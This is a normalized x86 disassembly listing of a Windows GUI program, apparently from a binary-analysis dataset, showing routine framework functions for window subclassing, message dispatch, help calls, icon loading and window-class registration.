lea eax [ ebp - 0x210 ]
push eax
push ebx
call [ GetClassNameW@IAT ]
test eax eax
je r-xdata
mov esi r--data
push esi
push ebx
call [ GetPropW@IAT ]
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x210 ]
push esi
push eax
call sub_41806d
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x214 ]
push esi
push ebx
call [ SetPropW@IAT ]
push esi
push ebx
call [ GetPropW@IAT ]
cmp eax [ ebp - 0x214 ]
jne r-xdata
push esi
call [ GlobalAddAtomW@IAT ]
push sub_41170e
push 0xfffffffc
push ebx
call [ SetWindowLongW@IAT ]
sub_411a7b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push sub_40a7f9
mov ecx rw-data
call sub_40ada8
mov esi eax
test esi esi
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] edi
je r-xdata
call sub_40a7dd
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_41185b
push 0x5
call [ SetWindowsHookExW@IAT ]
mov [ esi + 0x28 ] eax
test eax eax
jne r-xdata
call sub_40a7a5
sub_411ad5
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi ecx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x28 ] eax
call sub_40bc2a
mov eax [ eax + 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x64 ]
test eax eax
jne r-xdata
push 0xffffffff
push edi
call sub_40cc61
test eax eax
jne r-xdata
push esi
call sub_411a7b
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_40ed1c
add esp 0x30
mov edi eax
call sub_410167
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x11c ]
xor eax eax
jmp r-xdata
call sub_40a7dd
xor eax eax
test edi edi
setne al
mov eax [ esi ]
mov ecx esi
call [ eax + 0x11c ]
pop edi
pop esi
leave
retn 0x2c
sub_411bb4
mov edi edi
push ebx
push esi
mov ebx ecx
mov eax [ ebx ]
push edi
call [ eax + 0x128 ]
test eax eax
je r-xdata
mov esi [ SendMessageW@IAT ]
xor edi edi
push edi
push edi
push 0x1f
push [ ebx + 0x20 ]
call esi
push 0x1
push 0x1
push edi
push edi
push 0x1f
push [ ebx + 0x20 ]
call sub_410932
mov ecx ebx
call sub_4112d7
mov ebx eax
cmp ebx edi
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x188 ]
push edi
push edi
push 0x1f
push [ ebx + 0x20 ]
call esi
push 0x1
push 0x1
push edi
push edi
push 0x1f
push [ ebx + 0x20 ]
call sub_410932
call [ GetCapture@IAT ]
cmp eax edi
je r-xdata
call sub_40a7dd
pop edi
pop esi
pop ebx
retn
push edi
push edi
push 0x1f
push eax
call esi
sub_411c32
push 0x70
mov eax sub_425dcf
call sub_415bc0
mov edi ecx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] 0x7fffffff
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp ebx 0x111
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0xf0 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp ebx 0x6
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_40ef00
xor eax eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_4100ae
push eax
push [ ebp + 0xc ]
push edi
call sub_41161e
mov eax [ edi ]
lea edx [ ebp - 0x10 ]
push edx
push ecx
push [ ebp + 0xc ]
mov ecx edi
call [ eax + 0xf4 ]
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ edi + 0x4c ]
test eax eax
je r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_411696
test eax eax
jne r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_40ef00
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ebx eax
xor ebx [ ebp + 0x8 ]
push 0x7
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0x10 ] eax
and ebx 0x1ff
call sub_40eecc
imul ebx ebx 0xc
mov eax [ ebp + 0x8 ]
add ebx rw-data
mov [ ebp - 0x18 ] ebx
cmp eax [ ebx ]
jne r-xdata
cmp [ eax + 0x74 ] 0x0
jle r-xdata
call sub_415c98
retn 0x10
mov eax [ ebp - 0x18 ]
mov ebx [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax ebx
cmp ecx [ eax + 0x8 ]
jne r-xdata
cmp ebx 0x200
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ eax + 0x4 ]
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0x10 ] ebx
call sub_40ef00
test ebx ebx
je r-xdata
cmp ebx 0x100
jb r-xdata
cmp ebx 0x209
jbe r-xdata
cmp [ ebp + 0x8 ] 0xc000
push 0x0
push 0x0
jae r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x4 ] 0x0
lea ecx [ ebp - 0x14 ]
call sub_40ef00
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
lea eax [ ebx - 0x281 ]
cmp eax 0x10
ja r-xdata
cmp ebx 0x10f
jbe r-xdata
mov ecx [ edi + 0x4c ]
mov eax [ ecx ]
lea edx [ ebp - 0x10 ]
push edx
push esi
push [ ebp + 0xc ]
push ebx
call [ eax + 0x94 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x4 ]
push 0xc000
push eax
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebx + 0x4 ]
call sub_40e6c7
mov [ ebp + 0x10 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ eax + 0x14 ]
mov eax [ eax + 0x10 ]
lea ecx [ eax - 0x1 ]
cmp ecx 0x53
ja r-xdata
jmp r-xdata
call sub_40e6c7
mov ebx eax
test ebx ebx
jne r-xdata
call [ ebx ]
mov ebx eax
mov [ ebp + 0x10 ] ebx
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] eax
lea ecx [ ebp - 0x14 ]
call sub_40ef00
jmp [ ecx * 4 + jump_table_4121f6 ]
mov ebx [ ebx + 0x14 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebp + 0x8 ]
cmp [ eax ] ecx
je r-xdata
mov ebx [ ebp + 0x10 ]
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push [ ebp + 0xc ]
call sub_4139f1
push eax
push [ ebp + 0xc ]
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push esi
call sub_4100ae
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_4100ae
push esi
push [ ebp + 0xc ]
call sub_4100ae
jmp r-xdata
push esi
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call sub_413606
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] eax
call sub_40ef35
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x5c ] eax
call sub_4100da
test eax eax
jne r-xdata
lea ecx [ ebp - 0x28 ]
call sub_413606
mov eax [ esi + 0x4 ]
push [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call ebx
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_4100ae
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
call sub_413320
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
jmp r-xdata
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
mov eax esi
shr eax 0x10
cwde
push eax
movsx eax si
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push [ ebp + 0xc ]
call sub_4100ae
push eax
push esi
call sub_4100ae
push eax
xor eax eax
cmp [ edi + 0x20 ] esi
sete al
push [ ebp + 0xc ]
call sub_4139f1
push [ ebp + 0xc ]
call sub_413320
jmp r-xdata
mov eax esi
shr eax 0x10
cwde
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_413320
jmp r-xdata
push [ ebp + 0xc ]
push esi
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_4100ae
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_4100ae
mov ecx [ ebp + 0xc ]
movsx edx cx
shr ecx 0x10
movsx ecx cx
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] ecx
cmp eax 0x2a
jne r-xdata
push esi
jmp r-xdata
push esi
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
mov ecx edi
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push esi
call sub_413320
jmp r-xdata
push esi
call sub_413320
push eax
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_413320
jmp r-xdata
movzx ecx si
push ecx
mov eax esi
shr eax 0x10
mov ecx eax
and ecx 0xf000
push ecx
and eax 0xfff
push eax
push [ ebp + 0xc ]
call sub_4100ae
movzx eax [ ebp + 0xc ]
push esi
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push [ ebp + 0xc ]
jmp r-xdata
push esi
push esi
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x14 ]
mov [ eax + 0x4 ] ebx
call sub_40ef00
push 0x0
push 0x0
push 0xc000
add ebx 0x18
push ebx
mov ecx edi
call ebx
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
call ebx
and [ ebp - 0x24 ] 0x0
and [ ebp - 0x5c ] 0x0
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_410807
mov eax [ edi + 0x4c ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x0
call sub_413a38
jmp r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_4100ae
jmp r-xdata
push eax
push [ ebp + 0xc ]
call sub_4100ae
jmp r-xdata
push ecx
push edx
jmp r-xdata
push esi
call sub_4100ae
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push eax
push [ ebp + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
push eax
jmp r-xdata
push [ ebp + 0xc ]
push eax
mov ecx edi
call ebx
jmp r-xdata
lea eax [ ebp - 0x7c ]
push [ ebp - 0x5c ]
lea ecx [ eax + 0x24 ]
call sub_40c3cf
test eax eax
je r-xdata
mov [ ebp - 0x2c ] eax
sub_412346
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0xc
mov edx 0x111
push esi
cmp eax edx
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
lea edx [ eax - 0x132 ]
cmp edx 0x6
ja r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
push esi
shr eax 0x10
push esi
or eax 0xbd110000
push eax
push esi
call sub_40d52e
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
mov edx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
add eax 0xfffffece
push edi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
xor esi esi
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_411c32
cmp [ edi ] esi
pop edi
jne r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_411c32
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
xor eax eax
inc eax
cmp ecx esi
je r-xdata
cmp eax 0x2f
jbe r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
xor esi esi
push esi
lea eax [ ebp - 0x8 ]
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_40d52e
jmp r-xdata
sub_41242d
and [ rw-data ] 0x0
push esi
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
push 0x0
push 0x0
mov ecx esi
call sub_411397
pop esi
retn 0x8
mov ecx [ esi + 0x4c ]
mov eax [ ecx ]
push 0xfffffd3f
call [ eax + 0x50 ]
sub_412459
push 0x14
mov eax sub_425df4
call sub_415bf3
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
jne r-xdata
push 0x18
mov [ esi ] edi
mov [ ebp - 0x14 ] 0x8007000e
mov [ ebp - 0x4 ] edi
call sub_40a5cc
pop ecx
mov ecx eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] 0x1
cmp ecx edi
je r-xdata
mov eax 0x80004003
jmp r-xdata
xor eax eax
jmp sub_4124b7
push edi
call sub_4113e2
jmp sub_4124b7
call sub_415c98
retn 0x4
sub_4124f1
lea ecx [ ebp - 0x418 ]
call sub_40b45e
mov esi [ ebp - 0x41c ]
mov eax [ esi ]
xor edi edi
push edi
push 0x200
lea ecx [ ebp - 0x414 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call [ eax + 0xc ]
test eax eax
je r-xdata
push 0x497
push r--data
push r--data
lea eax [ ebp - 0x418 ]
push r--data
push eax
call sub_40cb1f
add esp 0x14
lea eax [ ebp - 0x414 ]
push eax
push 0x497
push r--data
push r--data
lea eax [ ebp - 0x418 ]
push r--data
push eax
call sub_40cb1f
add esp 0x18
jmp r-xdata
push edi
push edi
mov edi [ ebp - 0x418 ]
push edi
call sub_40bfa2
lea ecx [ edi - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_40b038
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
mov eax r-xdata
retn
sub_412598
push 0x0
mov eax sub_425e4a
call sub_415bc0
mov edi ecx
call sub_40bc2a
mov esi [ eax + 0x4 ]
lea ecx [ ebp + 0xb ]
call sub_40eeb6
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_411bb4
mov ecx edi
call sub_4112d7
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ esi + 0x64 ]
push [ eax + 0x20 ]
call [ WinHelpW@IAT ]
test eax eax
jne r-xdata
call sub_40a7dd
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xb ]
call sub_4124cb
call sub_415c98
retn 0x8
push 0xffffffff
push eax
push 0xf107
call sub_40bfd5
sub_412608
push 0x0
mov eax sub_425e4a
call sub_415bc0
mov edi ecx
call sub_40bc2a
mov esi [ eax + 0x4 ]
lea ecx [ ebp + 0xb ]
call sub_40eeb6
and [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_411bb4
mov ecx edi
call sub_4112d7
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ esi + 0x64 ]
push [ eax + 0x20 ]
call sub_4110f2
test eax eax
jne r-xdata
call sub_40a7dd
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xb ]
call sub_4124cb
call sub_415c98
retn 0x8
push 0xffffffff
push eax
push 0xf107
call sub_40bfd5
sub_412677
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x50 ] 0x0
je r-xdata
pop ebp
jmp sub_412346
push esi
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
call sub_40c79b
add esi 0xfffffece
cmp esi 0x6
pop esi
ja r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ecx ] eax
pop ebp
retn 0x10
sub_4126c0
push 0x4
mov eax sub_425e6d
call sub_415bc0
mov esi ecx
cmp [ ebp + 0xc ] 0xfffffffc
mov edi 0x80004005
jne r-xdata
mov eax edi
call sub_415c98
retn 0xc
mov eax [ esi ]
call [ eax + 0x90 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ esi + 0x2c ]
test eax eax
jne r-xdata
push eax
push [ ebp + 0x8 ]
push r--data
call LresultFromObject
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
xor edi edi
lea eax [ ebp - 0x10 ]
push eax
call sub_412459
mov edi eax
test edi edi
jl r-xdata
and [ ebp + 0xc ] 0x0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x10 ]
call sub_40eb49
test eax eax
jl r-xdata
mov eax [ ebp + 0xc ]
or [ ebp - 0x4 ] 0xffffffff
xor edi edi
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
lea edx [ esi + 0x34 ]
push edx
lea edx [ esi + 0x30 ]
push edx
mov [ esi + 0x2c ] eax
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
push [ esi + 0x2c ]
push [ ebp + 0x8 ]
push r--data
call LresultFromObject
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
sub_412780
push 0x30
mov eax sub_425e88
call sub_415bf3
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x38 ]
push eax
push [ edi + 0x24 ]
push [ edi + 0x10 ]
call sub_40ebf4
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
inc eax
push edi
call sub_40eb62
pop ecx
test ax ax
jne r-xdata
call sub_40bc2a
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_40ae76
and [ ebp - 0x4 ] 0x0
call sub_40bc2a
push [ edi + 0x24 ]
lea esi [ eax + 0x34 ]
mov ecx esi
call sub_40c2d4
push 0xa
mov ecx esi
call sub_40c202
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_40aee8
call sub_415c98
retn 0x4
sub_41280d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_40bc2a
movzx ecx [ ebp + 0x10 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconW@IAT ]
push ecx
push eax
call edi
mov [ esi + 0x14 ] eax
test eax eax
jne r-xdata
push esi
call sub_412780
pop edi
pop esi
pop ebp
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_412851
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
call sub_40bc2a
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
push 0x28
xor edi edi
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_415f60
mov eax [ DefWindowProcW@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_40bc2a
test [ ebp + 0x8 ] 0x1
mov eax [ eax + 0x8 ]
push 0x8
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x10 ] r--data
call sub_412780
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_412780
test eax eax
je r-xdata
inc esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_412780
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_41280d
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_41280d
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
push 0x3fc0
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0xff
call sub_4105c8
or esi eax
and [ ebp + 0x8 ] 0xffffc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
push 0x40
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x10
call sub_4105c8
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
push 0x80
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x2
call sub_4105c8
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_4105c8
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_4105c8
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x1
call sub_4105c8
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
push edi
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x40
call sub_4105c8
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_4105c8
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_4105c8
or esi eax
mov edi 0x8000
test [ ebp + 0x8 ] edi
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_4105c8
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push edi
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_4105c8
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_4105c8
or esi eax
mov eax 0x40000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_4105c8
or esi eax
mov eax 0x80000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_4105c8
or esi eax
mov ecx [ ebp - 0x4 ]
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edx 0x3fc0
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x1000
call sub_4105c8
or esi eax
mov eax esi
and eax [ ebp + 0x8 ]
pop edi
sub eax [ ebp + 0x8 ]
pop esi
neg eax
sbb eax eax
inc eax
pop ebx
or eax 0x10
mov [ ecx + 0x18 ] eax
or esi 0x10
sub_412b43
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
xor eax eax
inc eax
pop esi
pop ebp
retn 0x4
push 0x1
call sub_412851
mov [ esi + 0x28 ] r--data
sub_412bc5
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0xa8 ]
push [ ebp + 0x8 ]
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
pop ebp
retn 0x4
sub_412bec
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x20 ]
call [ SetWindowPos@IAT ]
pop ebp
retn 0x18
mov eax [ eax + 0x20 ]
sub_412c2a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x50 ] 0x0
jne r-xdata
push [ esi + 0x20 ]
call [ GetParent@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
add ecx 0x1c
call sub_40c3cf
test eax eax
je r-xdata
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov ecx [ eax + 0x4c ]
mov eax [ ecx ]
push 0x0
push esi
call [ eax + 0x9c ]
sub_412c6e
mov edi edi
push ebp
mov ebp esp
sub esp 0x204
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
test ebx ebx
jne r-xdata
test esi esi
je r-xdata
call sub_40a7dd
push esi
call [ lstrlenW@IAT ]
mov edi eax
xor eax eax
push 0x1fe
push eax
mov [ ebp - 0x204 ] ax
lea eax [ ebp - 0x202 ]
push eax
call sub_415f60
mov eax 0x100
add esp 0xc
cmp edi eax
ja r-xdata
push esi
